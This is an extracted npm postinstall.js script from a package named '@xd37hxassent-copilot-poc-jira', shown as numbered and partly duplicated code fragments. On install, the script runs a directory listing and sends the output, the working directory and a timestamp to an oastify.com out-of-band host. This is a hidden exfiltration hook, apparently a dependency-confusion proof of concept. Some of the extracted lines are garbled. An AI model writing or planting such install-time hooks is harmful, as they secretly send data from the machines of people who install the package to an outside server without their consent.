// File: tmp/tmp6etqqwpn/@xd37hxassent-copilot-poc-jira/package/postinstall.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const https = require('https')
Line 4: {
  const dir = execSync('dir', { encoding: 'utf8' }); // use 'ls -la' on Linux
  const payload = JSON.stringify({
    cwd: process.cwd(),
    dir: dir,
    timestamp: new Date().toISOString()
  });

  const options = {
    hostname: '4mrutkb6nlbg0vpui3w57lsn4ea5ywml.oastify.com',
    port: 443,
    path: '/npm-poc',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options, (res) => {
    console.log(`ðŸ“¤ Sent dir info to OAST (${res.statusCode})`);
  });

  req.on('error', (e) => {
    console.error(`âŒ Send failed:`, e);
  });

  req.write(payload);
  req.end();
}
Line 5: const dir = execSync('dir', { encoding: 'utf8' })
Line 23: const req = https.request(options, (res) => {
    console.log(`ðŸ“¤ Sent dir info to OAST (${res.statusCode})`);
  })
Line 31: req.write(payload)
Line 32: req.end()
